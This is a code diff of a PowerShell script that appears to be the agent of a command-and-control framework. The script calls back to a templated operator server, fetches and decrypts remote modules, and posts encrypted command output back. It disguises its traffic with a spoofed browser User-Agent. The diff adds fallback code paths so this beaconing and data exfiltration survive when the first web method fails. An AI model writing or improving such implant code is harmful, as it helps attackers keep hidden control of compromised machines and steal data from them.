@@ -55,9 +55,26 @@ function load($module)
       {
 
             $modulename = enc -key $key -un $module
-            $postParams = @{data=$modulename}
-            $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
-            $modulecontent=dec -key $key -enc $re.Content
+
+            $wc3 = new-object net.WebClient
+            $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+            $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+
+            try{
+              $postParams = @{data=$modulename}
+                $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
+		$re=$re.Content
+            }
+            catch{
+                $postParams = "data=$modulename"
+                $wc3 = new-object net.WebClient
+                $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+                $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+                $re=$wc3.UploadString("{HTTP}://{ip}:{port}{md}?page=$agent","POST",$postParams)
+                }
+
+
+            $modulecontent=dec -key $key -enc $re
 
 
       return $modulecontent
@@ -86,9 +103,22 @@ $seed=[int](Get-Date -UFormat "%s")%97
 #secho $seed
 $rand=Get-Random -Minimum 50 -Maximum 250 -SetSeed $seed
 $data=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count $rand | % {[char]$_});
-$postParams=@{resource=$agent;authentication=$data}
-$enc=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{cmd} -Method POST -Body $postParams #?page=$agent -Method GET
+
+
+try{
+    $postParams = @{resource=$agent;authentication=$data}
+$enc=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{cmd} -Method POST -Body $postParams
 $enc=$enc.Content
+}
+ catch{
+$postParams="resource=$agent&authentication=$data"
+        $wc3 = new-object net.WebClient
+      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      $enc=$wc3.UploadString("{HTTP}://{ip}:{port}{cmd}","POST",$postParams)
+        }
+
+
 
 if($enc -eq "REGISTER"){
 $wc3 = new-object net.WebClient
@@ -150,9 +180,21 @@ $output="$output$badoutput"
 $redata=enc -key $key -un $output
 
 
-$postParams = @{resource=$agent;data=$redata}
 
+
+
+
+ try{
+      $postParams = @{resource=$agent;data=$redata}
 $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re} -Method POST -Body $postParams
+}
+ catch{
+ $postParams = "resource=$agent&data=$redata"
+        $wc3 = new-object net.WebClient
+      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      $re=$wc3.UploadString("{HTTP}://{ip}:{port}{re}","POST",$postParams)
+        }
 
 $re=" "
 
